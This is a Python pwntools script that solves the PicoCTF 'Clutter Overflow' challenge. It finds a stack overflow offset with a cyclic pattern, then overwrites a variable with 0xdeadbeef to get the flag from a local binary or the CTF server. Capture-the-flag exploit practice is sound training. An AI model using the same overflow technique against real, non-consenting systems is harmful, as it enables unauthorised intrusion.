#!/usr/bin/env python3

"""
Toast's submission for the PicoCTF challenge Clutter Overflow.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./chall")

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('mars.picoctf.net', 31890)

    else:
        io = process([exe.path])

    return io



def main():
    '''Return the flag.
    '''

    with conn() as io:
        print(type(io))
        offset = get_offset(io)
    
    with conn() as io:
        payload = fit({
            offset:0xdeadbeef
        })

        io.sendlineafter(b"What do you see?", payload)
        flag = io.recvline_contains(b'picoCTF')
        log.success(flag.decode())
    
    return flag



def get_offset(io):
    '''Find the offset for code variable
    '''
    pat = cyclic(500, n=exe.bytes)
    io.sendlineafter(b"What do you see?", pat)
    io.recvuntil(b'code == 0x')
    code = io.recvline()
    ints = int(code.decode(), base=16)
    log.info(f"Code: {code}")
    log.info(f"Ints: {ints}")
    offset = cyclic_find(ints, n=exe.bytes)
    return offset


if __name__ == '__main__':
    main()
